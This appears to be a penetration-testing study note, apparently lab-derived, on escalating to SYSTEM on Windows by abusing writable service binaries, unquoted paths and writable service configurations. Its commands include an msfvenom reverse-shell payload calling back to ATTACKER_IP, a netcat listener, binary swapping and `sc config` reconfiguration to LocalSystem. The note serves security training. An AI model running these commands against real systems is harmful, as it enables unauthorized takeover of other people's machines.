---
type: technique
platform: windows
status: working
fluency: guided
source: thm
updated: 2026-10-08
---

# Windows — Service Misconfiguration Abuse

Three ways to make a Windows service run *your* file with *its* account's privileges. All three share one shape — **something the service depends on is writable by you** — and one tool chain: `sc.exe` to read the config (the built-in Windows service-control command), `icacls` to test file and folder permissions (also built in), `accesschk` to test the service object's own permissions (a free Microsoft Sysinternals tool that is **not** on the box — you download it on your attack box and copy it over, [[File-Transfer]]), and an `exe-service` payload to land the shell. Ranked easiest-first below; that is also roughly how often each appears.

Services are run by the **[[Security-Terms#^scm|SCM]]** (Service Control Manager). When a service starts, the SCM launches the executable named in the config, under the account named in the config.

## Read the service config first

**Why now** — [[Security-Terms#^winpeas|WinPEAS]] or your own eye flagged a non-Microsoft service, and before testing any permission you need the two fields that decide which of the three vectors applies: what the SCM runs, and who it runs it as. You are hoping for `LocalSystem` as the account and a binary sitting somewhere you can write.

```cmd
sc qc apphostsvc
```

- `sc qc <service>` → `qc` is **query config**: print how the SCM is set up to start this service. `sc query <service>` tells you only whether it is running; `sc qc` tells you what it runs and as whom, which is the pair of facts this note turns on.
- `BINARY_PATH_NAME` → the executable the SCM runs. Its location and quoting decide vectors 1 and 2.
- `SERVICE_START_NAME` → the account it runs *as*. `LocalSystem` is the jackpot; an unprivileged `svc*` account means a win here is only a lateral hop.
- `sc.exe` in PowerShell — see the warning below; plain `sc` there is a different command.

**What you will see**

- **Found** — a `BINARY_PATH_NAME` under a non-default folder (not `C:\Windows`) and/or a `SERVICE_START_NAME` of `LocalSystem`. Either is a reason to run the permission tests below.
- **Empty** — a service whose binary is under `C:\Windows\System32`, properly quoted, running as a locked-down account: real, and it closes that service. Most stock services look exactly like this — move to the next non-Microsoft service.
- **Error** — `[SC] OpenService FAILED 1060` means no service by that name; `5` is access denied reading it. `1060` after a copy-paste usually means a trailing space or wrong case in the service name.
- **Noise** — the dozens of services under `C:\Windows\System32\svchost.exe` are the OS. Only services whose binary lives **outside** `C:\Windows` are worth the permission tests.

**Then** — a writable-looking binary path goes to vector 1; an unquoted path with spaces to vector 2; a locked binary to the **[[Security-Terms#^dacl|DACL]]** test in vector 3 — a DACL (Discretionary Access Control List) is the list of who-may-do-what attached to an object, and a service has one of its own, entirely separate from the permissions on its executable file. A fully locked service closes and you move on — back to [[Windows-Privilege-Escalation]] if every service is stock.

> [!important] `sc` in PowerShell is not the service tool
> In PowerShell, `sc` is an alias for `Set-Content`. To control services you must type `sc.exe` in full. In `cmd.exe` plain `sc` is fine. Symptom of getting this wrong: `sc stop` silently creates a file called `stop` instead of stopping anything.

## The payload must be `exe-service`

**Why now** — you have found a writable dependency and are about to plant a payload where the SCM will run it. A service executable is not a normal program, so the payload format has to match or the shell dies on start — this is the step that decides whether the vector actually pays out.

On start, the SCM expects the executable to call back and report "I'm running" within ~30 seconds (the SCM handshake). A plain reverse-shell `.exe` never makes that call: you *may* catch a shell, but the SCM decides the service hung, kills the process, and your shell dies with it.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev.exe
```

- `msfvenom` → Metasploit's payload generator. It runs **on your attack box**, writes a file, and touches the target not at all; it ships with Kali and with any Metasploit install.
- `-p windows/x64/shell_reverse_tcp` → which payload to build: a 64-bit Windows program that opens a TCP connection back to you and hands your end a command prompt. Match the architecture to the target — `windows/shell_reverse_tcp` is the 32-bit name.
- `-f exe-service` → wraps the payload so it answers the SCM *and* spawns the shell in a child that outlives the handshake. This is the flag that matters; `-f exe` here is the single most common reason "the exploit worked but my shell died".
- `-o rev.exe` → the file to write. Leave it out and msfvenom prints raw binary to your terminal.
- your **listener** → the program on your box that waits for that connection. Start it *before* you trigger anything: `nc -lvnp 4444` (netcat: `-l` listen, `-v` verbose so you see the connect, `-n` no DNS lookups, `-p` port), and the port must be the number you put in `LPORT`.
- `LHOST`/`LPORT` → your listener's address and port, baked into the binary. Wrong `LHOST` (your [[Security-Terms#^vpn|VPN]] vs your [[Security-Terms#^lan|LAN]] address) means the shell dials a number that does not answer.

After dropping the payload where another account will execute it, open it up so that account can:

```cmd
icacls C:\path\to\rev.exe /grant Everyone:RX
```

- `/grant Everyone:RX` → the service account is not you, so without a grant it may not be able to read or execute the file you just dropped, and the service fails to start with nothing in your listener. `RX` is read and execute, which is all it needs; `F` is full control and hands over write as well, which nothing here uses.

**What you will see**

- **Found** — `Payload size` and `Saved as: rev.exe` from msfvenom; `Successfully processed 1 files.` from `icacls`. The payload is ready to plant.
- **Empty** — no blank state: msfvenom prints a saved-path line or it errors. A command here that returns nothing at all did not run — re-issue it rather than assuming an empty payload.
- **Error** — `msfvenom` complaining about the format means a typo in `exe-service`. `icacls` `Access is denied.` on your own dropped file means you copied it somewhere you cannot re-ACL — drop it in a folder you own.
- **Noise** — the grant on the dropped file is scoped to this one payload; it weakens nothing else on the host. msfvenom's encoder/size chatter is progress, not a fault.

**Then** — with the payload built, go to whichever vector your `sc qc` reading pointed at. The same `exe-service` payload serves vectors 1, 2 and scheduled tasks; [[Security-Terms#^msi|MSI]] and DLL payloads are their own formats for their own vectors.

## Vector 1 — writable service binary

**Why now** — `sc qc` showed a binary outside `C:\Windows`, and you want to know whether its [[Security-Terms#^acl|ACL]] lets you overwrite it directly. If it does, the service runs your payload as its account on the next start — the simplest of the three.

```cmd
sc qc <service>
```

```cmd
icacls "C:\Path\To\service.exe"
```

- `icacls` on the binary → the built-in command that prints a file's access control list. Read it for a **principal** — the user or group an entry names — that **you are** (`whoami /groups` first, which lists every group you belong to) holding `F`, `M`, or `W`. `Everyone:(M)` or `BUILTIN\Users:(M)` on a service binary is the finding.

**What you will see**

- **Found** — an `icacls` line pairing a principal you belong to with `(F)`, `(M)` or `(W)`. Full reading of the letters: [[Windows-Privilege-Escalation#Reading `icacls` output|the icacls section]].
- **Empty** — only `SYSTEM`, `Administrators` and a read-only `Users` entry: the binary is locked, so this vector is closed for this service. Try vector 2 (its folder) or vector 3 (its DACL) before leaving the service.
- **Error** — `Access is denied.` reading the ACL is itself a limit, not a clearance — you cannot even see the permissions, so treat the binary as locked for now.
- **Noise** — `NT AUTHORITY\SYSTEM:(F)` and `BUILTIN\Administrators:(F)` are on every service binary on disk and mean nothing; do not mistake them for a grant to you.

Overwrite it — rename, do not delete, so the real binary survives:

```cmd
cd "C:\Path\To"
```

```cmd
move service.exe service.exe.bak
```

```cmd
move C:\Users\you\rev.exe service.exe
```

```cmd
icacls service.exe /grant Everyone:RX
```

```cmd
sc stop <service> & sc start <service>
```

- `move` → renames or moves a file. Renaming the real binary to `.bak` rather than deleting it means you can put the service back afterwards, which matters on anything that is not a throwaway lab host.
- `/grant Everyone:RX` → lets every account read and execute the file you just planted, because the service account is not you and by default cannot read a file you created. Read and execute is the whole requirement; full control would be handing out more than the vector needs.
- `&` → cmd.exe's "run this, then run that" separator, so the stop and the start happen in one line. The restart is what makes the SCM launch your file; without it nothing happens until the host reboots.

**Then** — a landed shell has *whatever `SERVICE_START_NAME` was* — check `whoami` immediately. `LocalSystem` ends the box; an unprivileged `svc*` account is a lateral hop that sets up the next escalation. A locked binary sends you to vector 2 or 3 on the same service.

## Vector 2 — unquoted service path

**Why now** — you want every service on the host that has this defect, not one at a time. `sc qc` answers for a single service; this sweep answers for all of them, and it is the command to run the moment you have a shell and know you are looking at services.

```powershell
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -notlike '*\Windows\*' } | Select-Object Name,StartMode,PathName
```

- `-notlike '"*'` → keep only services whose `PathName` does **not** begin with a double quote. That is the whole defect: a quoted path is immune, because the quotes tell the SCM exactly what to run.
- The single quotes around `'"*'` are load-bearing. The pattern itself contains a double quote, so the double-quoted spelling needs escaping and usually ends up matching nothing — and a `-notlike` that matches nothing excludes nothing, so the full list comes back and the host looks full of findings.
- `-notlike '*\Windows\*'` → drops Microsoft's own services, which are hundreds of rows and none of the answer. The leading `*` is mandatory: `PathName` starts with `C:`, so without it the filter excludes zero rows and you read 200 lines believing you filtered.
- `StartMode` is the column the write-up version of this command drops, and it decides whether the vector pays out today: `Auto` means the service starts at boot, so your planted binary runs at the next reboot without you needing the right to restart anything. `Manual` or `Disabled` means you need a trigger as well as a write.
- Roughly 200 services in, 5-15 past the `C:\Windows` filter, 0-3 that are both unquoted **and** carry a space inside the executable path. Only that last group is this vector.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v /c:"C:\Windows" | findstr /v """
```

- The `cmd` fallback, for a shell with no PowerShell — and note `wmic` is gone entirely on Windows 11 and Server 2025, which is a missing tool, not an answer.
- The second `findstr` drops the correctly quoted paths, and `"""` is how a literal double quote is written as a findstr search string — three of them, no `/c:`, because there is no space to protect. It is the fragile part of the line: if it swallows everything or nothing, drop that filter and read the `PathName` column yourself. After the `C:\Windows` filter that is 5-15 rows, not 200.

Windows resolves an unquoted path left to right and runs the first thing that exists, so if you can write a file at one of the earlier names, the SCM runs yours instead. You are testing whether any earlier path segment sits in a folder you can write.

```text
BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

`cmd` splits an unquoted command on spaces, so the SCM tries each of these in order, running the first that exists:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

A properly quoted path — `"C:\...\disksrs.exe"` — is immune; the quotes tell the SCM exactly what to run. Test the *directory*, not the file:

```cmd
icacls C:\MyPrograms
```

- Look for your principal with `(AD)` **append data / add subdirectory** or `(WD)` **write data / add file** — either lets you create the planted `.exe`. `(F)`/`(M)` on the folder work too.
- Testing the file instead of the folder is the mistake here: the file ACL denies you, you stop, and never check that the *folder* lets you drop a new file beside it.

**What you will see**

- **Found** — `(AD)`, `(WD)`, `(M)` or `(F)` for your principal on an earlier folder in the path (`C:\MyPrograms`). That is the green light to plant `Disk.exe`.
- **Empty** — the writable spot is under `C:\Program Files`, which unprivileged users cannot write, so **most unquoted paths are not exploitable**. Only a non-default, loosened folder opens it up. A locked folder closes this vector.
- **Error** — `Access is denied.` on `icacls C:\MyPrograms` means you cannot read the folder ACL; treat it as not writable until proven otherwise.
- **Noise** — a write grant on a folder **later** than the first-existing binary is useless; only a segment the SCM reaches *before* the real exe counts.

Plant at the earlier name and restart:

```cmd
move C:\Users\you\rev.exe C:\MyPrograms\Disk.exe
```

```cmd
icacls C:\MyPrograms\Disk.exe /grant Everyone:RX
```

```cmd
sc stop <service> & sc start <service>
```

**Then** — same as vector 1: `whoami` decides whether this is SYSTEM or a lateral hop. A folder you cannot write sends you to vector 3, the service's own DACL.

## Vector 3 — writable service configuration (DACL)

**Why now** — the binary is locked and the path is quoted, but the **service's own** access control list may let you *reconfigure* it. If so you touch no file at all: point the service at your payload and set its account to `LocalSystem` directly. This is the only one of the three where you *choose* the account, so it reaches SYSTEM even when the service was running as something smaller.

```cmd
accesschk64.exe -qlc <service>
```

- `accesschk64.exe` → a free Microsoft Sysinternals tool that prints the permissions on an object. It is not on the box: on Kali, `wget https://download.sysinternals.com/files/AccessChk.zip` then `unzip` it, and copy `accesschk64.exe` to the target ([[File-Transfer]]), taking the `64` build on a 64-bit host. Older releases prompt to accept a licence on first run; add `/accepteula` to the command so it does not hang waiting for a click in a non-interactive shell.
- `-c` → treat the argument as a service name.
- `-l` → dump the DACL (who may do what to the service).
- `-q` → drop the banner. Add `-v` to spell out each right.

**What you will see**

- **Found** — **`SERVICE_CHANGE_CONFIG`** (or `SERVICE_ALL_ACCESS`, which contains it) granted to `BUILTIN\Users`, `Everyone`, `Authenticated Users`, or your user. That is the permission to rewrite the config; you also need `SERVICE_STOP` + `SERVICE_START` (both inside `SERVICE_ALL_ACCESS`) to trigger it.
- **Empty** — only `SYSTEM` and `Administrators` holding `SERVICE_CHANGE_CONFIG` is a clean negative: this vector is closed, so do **not** run `sc config` — it will only return access denied. Move to the next service.
- **Error** — `accesschk64.exe` must be transferred to the target first ([[File-Transfer]]); a version mismatch (`accesschk.exe` 32-bit on a 64-bit host) can misread. `No matching services` means a wrong service name.
- **Noise** — `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS` and `SERVICE_INTERROGATE` for `Users` are read-only rights — everyone has them and they change nothing.

Reconfigure and restart:

```cmd
sc config <service> binPath= "C:\Users\you\rev.exe" obj= LocalSystem
```

```cmd
sc stop <service> & sc start <service>
```

- `binPath=` → the executable the SCM will run from now on. Point it at your planted payload.
- `obj=` → the account the service will run as. `LocalSystem` is the built-in account that outranks any administrator and needs no password, which is why this vector reaches SYSTEM whatever the service was running as before.

> [!important] The space after each `=` is mandatory
> `sc config` syntax is `option= value` — the space goes **after** the equals sign, not before. `binPath="..."` (no space) is silently misparsed; `binPath= "..."` is correct. This is the single most common reason this vector "doesn't work".

**Then** — `obj= LocalSystem` needs no password and is the highest-privileged account on the host, so a landed shell here is SYSTEM directly — `whoami` confirms. A clean negative from `accesschk` sends you back to vectors 1 and 2 on other services, or to [[Windows-Privilege-Escalation]] for the non-service paths.

## Rarely — worth one command, not worth a step

**Why now** — the three vectors above came back empty: the binary is not writable, the path is quoted, and the configuration is locked. One property of a service is left, and almost nobody checks it.

```cmd
sc qfailure <service>
```

- A service can be configured to run a command when it crashes, and that command runs with the service's own account. If the recovery command points at something you may write, you have vector 1 again by a different door.
- The same output tells you the reset period and the action for each successive failure, which is what decides whether crashing the service once is enough.

**What you will see**

- **Found** — a `COMMAND_LINE` line with a path in it. Test that path with `icacls` exactly as in vector 1.
- **Empty** — `FAILURE_ACTIONS` with no command line is the normal answer; most services only restart themselves.
- **Error** — `Access is denied` here means you may not read this service's configuration, which is itself the answer to vector 3 for that service.
- **Noise** — a restart action pointing at nothing is stock on most Windows services and grants nothing.

**Then** — a writable recovery command goes back to vector 1 above, unchanged. Nothing found means the service is genuinely closed and the next candidate from step 3 of [[Windows-Run-Sheet]] is a better use of the time.

## Reading the output

Two signals across all three vectors trip people up.

**`sc start` returning error 1053 is not the failure it looks like.** `1053` = "the service did not respond to the start request in time" — which is exactly what happens when the binary is your payload instead of a real service that answers the SCM. Check your listener, not the error. This is *the* reason to use `exe-service`: with a plain `.exe` the process is also killed; with `exe-service` the shell survives the timeout.

**The shell has the service account's privileges, whatever they are.** Vectors 1 and 2 give you *whatever `SERVICE_START_NAME` was* — often an unprivileged `svc*` account, not SYSTEM, so this may be a lateral hop that sets up the next escalation, not the finish. Vectors 1 and 2 reach SYSTEM only when the service was already running as it. Vector 3 lets you *choose* `LocalSystem`, which is why it is the one that does not depend on what you found. Check with `whoami` the moment the shell lands, and if it is not SYSTEM, run the whole enumeration again as the new account.

## Next

- [[Windows-Privilege-Escalation]] — the other vectors, and the full `icacls` reading table
- [[Windows-Automated-Enumeration]] — WinPEAS flags these three under "Services"
- [[Shells]] — stabilising the reverse shell once it lands
- [[File-Transfer]] — getting the payload onto the host

## Gaps

- Restarting the service assumes you may stop/start it. When you cannot, the payload waits for the next reboot — no note yet on forcing or waiting out a reboot, or on services set to `AUTO_START` vs `DEMAND_START`.
- Scheduled tasks are the same "runs as another user, writable target" pattern with different tooling (`schtasks`); they still live inline in [[Windows-Privilege-Escalation]] and could become a sibling note.
- DLL hijacking (a service loading a DLL by name from a writable directory) is the same shape and still unwritten — stubbed in [[Windows-Privilege-Escalation]].
- Registry-based service tampering (`HKLM\SYSTEM\CurrentControlSet\Services\` writable keys) is a fourth path to the same reconfigure; only mentioned, not covered.
